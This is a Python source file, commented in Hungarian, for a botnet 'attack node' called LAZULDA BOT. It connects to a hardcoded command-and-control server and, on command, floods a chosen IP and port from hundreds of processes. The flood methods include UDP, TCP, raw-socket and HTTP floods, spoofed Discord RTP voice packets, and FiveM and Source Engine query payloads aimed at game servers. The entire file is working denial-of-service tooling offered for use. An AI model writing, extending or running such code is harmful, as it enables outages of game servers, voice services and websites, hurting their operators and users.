#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
 LAZULDA BOT v1.5.1  –  ATTACK NODE (DISCORDV EREDETI)
============================================================
 GitHub Codespaces / VPS / bármilyen gépre telepíthető bot.
 Csatlakozik a VPS-en futó bot-parancsszerverhez (26000-es port),
 és onnan kapja a támadási parancsokat.

 NEM indít webszervert -> Codespaces nem blokkolja.

 DISCORDV – EREDETI ERŐS VERZIÓ (app.py stílus):
   - 1 socket / worker
   - 150 csomag / ciklus
   - 64-128 byte payload (valódi Opus frame)
   - RTP header: 0x80 0x78 + seq + ts + ssrc (random)
   - IP_TOS = 0xB8 (EF: voice priority)
   - IP_TTL = 64
   - SO_SNDBUF = 4 MB
   - Non-blocking küldés
   - Instant stop ellenőrzés

 Támogatott exploitok:
   - PCK-GOD, PCK-GOD-TCP, PCK-*
   - DISCORDV (eredeti erős)
   - FIVEVM1 / FIVEVM3 / FIVEM-KILL
   - FORT / GAME / DAYZ / CSFACIT
   - SRAMGRAM / OMTV / OMEGA / RAVE / TEAMSPEAK
   - AMP / SDCC / SISPHERE / MINC / HOME-KILL / HOME
   - HTTP / CLOUDFLARE / EMU / TLS / BROWSERV2 / BROWSER / BYPASS / HTTP-DREX
   - UDP: RAW, ULTIMATE, UDPBYPASS, OVERLOAD, UDP-M2, UDPPPS, UDPMIX, DNS, HUDP
   - TCP: TCPBYPASS, ACK, TCPMIX, 2-ACK, OVH, TCP-OVH, SOCKET, TCP-KILL
============================================================
"""

import os
import sys
import time
import random
import struct
import socket
import multiprocessing
import threading
import gc

# ============================================================
#  KONFIG
# ============================================================
VPS_IP   = "79.122.103.185"     # <- a VPS-ed IP-je
VPS_PORT = 6767                 # <- a bot-parancsszerver portja

RECONNECT_DELAY = 3.0
MAX_THREADS = 300
MAX_TIME    = 3600
MIN_TIME    = 1

# ============================================================
#  SZÍNEK
# ============================================================
R, G, Y, C, M, W, RESET = (
    "\033[31m", "\033[32m", "\033[33m",
    "\033[36m", "\033[35m", "\033[97m", "\033[0m"
)

# ============================================================
#  PAYLOAD ÉPÍTŐK
# ============================================================
def build_discordv_payload():
    """
    Eredeti app.py stílusú Discord / WebRTC RTP voice packet.
    RTP header (12 byte):
        V=2, P=0, X=0, CC=0   -> 0x80
        M=0, PT=120 (Opus)    -> 0x78
        sequence number       -> 2 byte random
        timestamp             -> 4 byte random
        SSRC                  -> 4 byte random
    Payload: 64-128 byte random
    """
    header = b"\x80\x78" + os.urandom(2) + os.urandom(4) + os.urandom(4)
    return header + os.urandom(random.randint(64, 128))


def build_payload(method):
    """A metódushoz tartozó payload."""
    m = method.upper()

    # ---- PCK család ----
    if m in ("PCK-GOD", "PCK-GOD-TCP", "PCK-MAX", "ULTRA-PCK", "PPS-RAW", "PCK-TCP"):
        return b""
    if m in ("PCK", "PCK-UDP", "PCK-RAW", "PPS-UDP"):
        return b"\x00"
    if m == "NANO-PCK":
        return b"\x01"
    if m == "PCK-BURST":
        return b"\x00" * 10
    if m == "PPS":
        return b"\x00" * random.randint(1, 4)

    # ---- DISCORDV (eredeti) ----
    if m == "DISCORDV":
        return build_discordv_payload()

    # ---- UDP ----
    if m in ("RAW", "ULTIMATE", "UDPBYPASS", "OVERLOAD", "UDP-M2"):
        return os.urandom(1450)
    if m in ("UDPPPS", "UDPMIX", "DNS", "HUDP"):
        return os.urandom(random.choice([64, 128, 512]))

    # ---- TCP ----
    if m in ("TCPBYPASS", "ACK", "TCPMIX", "2-ACK", "OVH", "TCP-OVH", "SOCKET", "TCP-KILL"):
        return os.urandom(1024)

    # ---- FiveM exploit ----
    if m in ("FIVEVM1", "FIVEVM3", "FIVEM-KILL"):
        return b"\xff\xff\xff\xffgetstatus " + os.urandom(32)

    # ---- Source Engine exploit ----
    if m in ("FORT", "GAME", "DAYZ", "CSFACIT"):
        return (b"\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e"
                b"\x65\x20\x51\x75\x65\x72\x79\x00")

    # ---- Voice / game server ----
    if m in ("SRAMGRAM", "OMTV", "OMEGA", "RAVE", "TEAMSPEAK", "LAGG"):
        return b"\x00" * 8 + os.urandom(48)

    # ---- AMP / SDCC ----
    if m in ("AMP", "SDCC", "SISPHERE", "MINC", "HOME-KILL", "HOME"):
        return os.urandom(1024)

    # ---- HTTP / L7 ----
    if m in ("HTTP", "CLOUDFLARE", "EMU", "TLS", "BROWSERV2", "BROWSER", "BYPASS", "HTTP-DREX"):
        return (f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                f"Host: target\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Accept: */*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Connection: keep-alive\r\n\r\n").encode()

    return os.urandom(512)


# ============================================================
#  ATTACK WORKER
# ============================================================
def worker(ip, port, method, stop_flag):
    """
    Egy worker folyamat. Amíg stop_flag.value == 0, addig küldi a csomagokat.
    Minden küldés előtt ellenőrzi a stop flag-et -> instant stop.
    """
    gc_disabled = False
    try:
        gc.disable()
        gc_disabled = True
    except Exception:
        pass

    m = method.upper()

    GOD_UDP = {"PCK-GOD", "PCK", "PCK-UDP", "PCK-BURST", "ULTRA-PCK", "NANO-PCK", "PPS", "PPS-UDP"}
    GOD_TCP = {"PCK-GOD-TCP", "PCK-TCP", "PCK-MAX"}
    GOD_RAW = {"PCK-RAW", "PPS-RAW"}
    TCP_SET = GOD_TCP | {"TCP", "HTTP", "BROWSER", "TLS", "SOCKET",
                         "TCPBYPASS", "ACK", "TCPMIX", "2-ACK", "OVH",
                         "TCP-OVH", "TCP-KILL"}

    is_discordv = (m == "DISCORDV")
    is_god_udp  = m in GOD_UDP
    is_god_tcp  = m in GOD_TCP
    is_god_raw  = m in GOD_RAW
    is_tcp      = m in TCP_SET

    # ============================================================
    #  DISCORDV – EREDETI ERŐS VERZIÓ (app.py stílus)
    #  1 socket, 150 csomag / ciklus
    # ============================================================
    if is_discordv:
        target = (ip, port)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            except Exception:
                pass
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except Exception:
                pass
            try:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0xB8)   # EF: voice
            except Exception:
                pass
            try:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 64)
            except Exception:
                pass
            sock.setblocking(False)
        except Exception:
            if gc_disabled:
                try:
                    gc.enable()
                except Exception:
                    pass
            return

        try:
            while stop_flag.value == 0:
                # EREDETI: 150 csomag / ciklus
                for _ in range(150):
                    if stop_flag.value != 0:
                        break
                    try:
                        sock.sendto(build_discordv_payload(), target)
                    except (BlockingIOError, OSError):
                        pass
                    except Exception:
                        pass
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            if gc_disabled:
                try:
                    gc.enable()
                except Exception:
                    pass
        return

    # ============================================================
    #  MINDEN MÁS METÓDUS – EGY SOCKET
    # ============================================================
    if is_god_raw:
        proto = socket.SOCK_RAW
    elif is_tcp:
        proto = socket.SOCK_STREAM
    else:
        proto = socket.SOCK_DGRAM

    s = None
    try:
        s = socket.socket(socket.AF_INET, proto)

        if is_god_udp:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
            s.setblocking(False)
            try:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, 0)
            except Exception:
                pass
            try:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0xB8)
            except Exception:
                pass
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
            except Exception:
                pass

        elif is_god_tcp:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
            s.settimeout(0.05)
            try:
                s.connect((ip, port))
            except Exception:
                pass

        elif is_god_raw:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
            s.setblocking(False)

        else:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
            if is_tcp:
                s.settimeout(0.05)
                try:
                    s.connect((ip, port))
                except Exception:
                    pass

    except Exception:
        if s:
            try:
                s.close()
            except Exception:
                pass
        return

    target = (ip, port)

    if is_god_udp or is_god_raw:
        payload = build_payload(m)
        burst = 512
    elif is_god_tcp:
        payload = build_payload(m)
        burst = 128
    else:
        payload = build_payload(m)
        burst = 128

    try:
        if is_god_udp or is_god_raw:
            while stop_flag.value == 0:
                for _ in range(burst):
                    if stop_flag.value != 0:
                        return
                    try:
                        s.sendto(payload, target)
                    except (BlockingIOError, OSError):
                        pass

        elif is_god_tcp:
            while stop_flag.value == 0:
                try:
                    for _ in range(burst):
                        if stop_flag.value != 0:
                            return
                        s.send(payload)
                except Exception:
                    try:
                        s.close()
                    except Exception:
                        pass
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
                        s.settimeout(0.05)
                        s.connect(target)
                    except Exception:
                        time.sleep(0.001)

        elif is_tcp:
            while stop_flag.value == 0:
                try:
                    for _ in range(burst):
                        if stop_flag.value != 0:
                            return
                        s.send(payload)
                except Exception:
                    try:
                        s.close()
                    except Exception:
                        pass
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.05)
                        s.connect(target)
                    except Exception:
                        time.sleep(0.01)

        else:
            while stop_flag.value == 0:
                for _ in range(burst):
                    if stop_flag.value != 0:
                        return
                    try:
                        s.sendto(payload, target)
                    except Exception:
                        pass

    except Exception:
        pass

    finally:
        try:
            s.close()
        except Exception:
            pass
        if gc_disabled:
            try:
                gc.enable()
            except Exception:
                pass


# ============================================================
#  WORKER KEZELÉS
# ============================================================
_workers = []
_worker_lock = threading.Lock()
_stop_flag = multiprocessing.Value('b', 0)


def stop_all():
    """Az összes futó worker AZONNALI leállítása."""
    global _workers

    try:
        _stop_flag.value = 1
    except Exception:
        pass

    with _worker_lock:
        old = list(_workers)
        _workers = []

    for p in old:
        try:
            if p.is_alive():
                p.terminate()
        except Exception:
            pass

    for p in old:
        try:
            if p.is_alive():
                p.join(timeout=0.1)
        except Exception:
            pass


def start_attack(ip, port, duration, method, threads):
    """Új támadás indítása."""
    global _workers

    stop_all()

    try:
        _stop_flag.value = 0
    except Exception:
        pass

    threads  = max(1, min(int(threads), MAX_THREADS))
    duration = max(MIN_TIME, min(int(duration), MAX_TIME))

    new_workers = []
    for _ in range(threads):
        try:
            p = multiprocessing.Process(
                target=worker,
                args=(ip, port, method, _stop_flag),
                daemon=True,
            )
            p.start()
            new_workers.append(p)
        except Exception as e:
            print(f"{R}[!] Worker hiba: {e}{RESET}")

    with _worker_lock:
        _workers = new_workers

    def timer():
        try:
            time.sleep(duration)
            _stop_flag.value = 1
        except Exception:
            pass

    threading.Thread(target=timer, daemon=True).start()


# ============================================================
#  KLIENS – CSATLAKOZÁS A VPS-HEZ
# ============================================================
def handle_cmd(line):
    """A VPS-től kapott parancs feldolgozása."""
    parts = line.strip().split()
    if not parts:
        return

    cmd = parts[0].lower()

    if cmd == "start" and len(parts) >= 6:
        try:
            ip      = parts[1]
            port    = int(parts[2])
            dur     = int(parts[3])
            method  = parts[4]
            threads = int(parts[5])
            print(f"{G}[>] START {method} -> {ip}:{port} ({dur}s, {threads} thr){RESET}")
            start_attack(ip, port, dur, method, threads)
        except Exception as e:
            print(f"{R}[!] start error: {e}{RESET}")

    elif cmd == "stop":
        print(f"{Y}[>] STOP{RESET}")
        stop_all()

    elif cmd == "ping":
        pass


def client_loop():
    """
    Fő ciklus: csatlakozás a VPS-hez, parancsok fogadása.
    """
    while True:
        s = None
        try:
            print(f"{Y}[*] Csatlakozas: {VPS_IP}:{VPS_PORT}...{RESET}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((VPS_IP, VPS_PORT))
            s.settimeout(1.0)

            try:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception:
                pass

            print(f"{G}[+] Csatlakozva a VPS-hez!{RESET}")

            try:
                s.sendall(b"HELLO LAZULDA-BOT\n")
            except Exception:
                pass

            buf = b""
            while True:
                try:
                    ch = s.recv(1)
                except socket.timeout:
                    continue
                if not ch:
                    print(f"{R}[!] Kapcsolat megszakadt.{RESET}")
                    break
                if ch == b"\n":
                    line = buf.decode(errors="replace").strip()
                    buf = b""
                    if line:
                        handle_cmd(line)
                elif ch == b"\r":
                    continue
                else:
                    buf += ch
                    if len(buf) > 4096:
                        buf = b""

        except KeyboardInterrupt:
            print(f"\n{R}[!] Kilepes...{RESET}")
            stop_all()
            sys.exit(0)
        except Exception as e:
            print(f"{R}[!] Hiba: {e}{RESET}")
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

        print(f"{Y}[*] Ujracsatlakozas {RECONNECT_DELAY}s mulva...{RESET}")
        time.sleep(RECONNECT_DELAY)


# ============================================================
#  MAIN
# ============================================================
if __name__ == "__main__":
    try:
        multiprocessing.set_start_method("fork", force=True)
    except Exception:
        pass

    print(f"{G}+----------------------------------------------------------+")
    print(f"|     LAZULDA BOT v1.5.1  -  ATTACK NODE (DISCORDV EREDETI) |")
    print(f"+----------------------------------------------------------+{RESET}")
    print(f"{Y}[!] DISCORDV: 1 socket, 150 csomag / ciklus (app.py stílus){RESET}")
    print(f"{Y}[!] DISCORDV: 64-128 byte payload + RTP 0x80 0x78{RESET}")
    print(f"{Y}[!] DISCORDV: IP_TOS=0xB8 | TTL=64 | 4MB SNDBUF{RESET}")
    print(f"{C}[!] Exploits: FiveM getstatus, Source Engine, TS3{RESET}")
    print(f"{C}[!] Max threads: {MAX_THREADS} | Max time: {MAX_TIME}s{RESET}")
    print(f"{C}[!] VPS: {VPS_IP}:{VPS_PORT}{RESET}\n")

    client_loop()